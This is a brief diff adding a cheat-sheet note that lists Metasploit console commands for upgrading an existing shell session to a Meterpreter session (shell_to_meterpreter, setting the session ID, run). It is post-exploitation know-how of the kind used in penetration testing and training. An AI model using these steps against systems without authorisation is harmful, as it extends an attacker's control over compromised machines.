@@ -1,0 +1,10 @@
+Elevating a Metasploit Shell
+
+Once a shell has been created, use these commands in Metasploit
+
+	search shell_to_meterpreter
+	use 0
+	sessions -l (Note Session ID)
+	show options
+	set SESSION [ID]
+	run
